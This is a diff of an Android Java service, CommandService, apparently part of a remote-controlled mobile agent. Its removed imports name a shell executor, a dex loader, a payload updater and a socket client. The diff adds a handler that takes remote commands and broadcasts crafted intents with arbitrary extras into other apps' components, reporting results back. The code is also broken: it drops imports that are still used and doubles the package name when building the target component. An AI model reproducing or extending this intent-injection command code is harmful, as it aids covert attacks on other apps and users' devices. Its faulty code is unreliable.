@@ -1,32 +1,10 @@
 package com.mobilemorph.agent.services;
 
-import android.app.Service;
-import android.content.Intent;
-import android.os.IBinder;
-import android.provider.Settings;
-import android.util.Log;
-import android.os.Build;
-import android.content.SharedPreferences;
-import android.content.Context;
-
-import com.mobilemorph.agent.util.ShellExecutor;
-import com.mobilemorph.agent.util.DexLoader;
-import com.mobilemorph.agent.util.PayloadUpdater;
-
-import org.json.JSONObject;
-
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
-//import java.lang.module.ModuleDescriptor;
 import java.net.HttpURLConnection;
-//import java.net.Socket;
 import java.net.URL;
-import java.util.concurrent.ScheduledThreadPoolExecutor;
-
-import io.socket.client.IO;
-import io.socket.client.Socket;
-import io.socket.emitter.Emitter;
 
 public class CommandService extends Service {
     private static final String TAG = "CommandService";
@@ -193,6 +171,38 @@ public class CommandService extends Service {
             conn.getResponseCode();
         } catch (Exception e) {
             Log.e(TAG, "postOutput() failed", e);
+        }
+    }
+
+    private void handleIntentInjection(JSONObject args) {
+        try {
+            String pkg = args.getString("package");
+            String component = args.optString("component", pkg + ".MyReceiver");
+            String action = args.optString("action", "android.intent.action.SEND");
+
+            JSONObject extras = args.optJSONObject("extras");
+            Intent intent = new Intent(action);
+            intent.setComponent(new ComponentName(pkg, pkg + component));
+
+            if (extras != null) {
+                Iterator<String> keys = extras.keys();
+                while (keys.hasNext()) {
+                    String key = keys.next();
+                    Object value = extras.get(key);
+                    if (value instanceof Boolean) {
+                        intent.putExtra(key, (Boolean) value);
+                    } else if (value instanceof Integer) {
+                        intent.putExtra(key, (Integer) value);
+                    } else {
+                        intent.putExtra(key, value.toString());
+                    }
+                }
+            }
+
+            context.sendBroadcast(intent);
+            sendResult("Intent injection sent to: " + pkg + component);
+        } catch (Exception e) {
+            sendResult("Error during intent injection: " + e.getMessage());
         }
     }
 
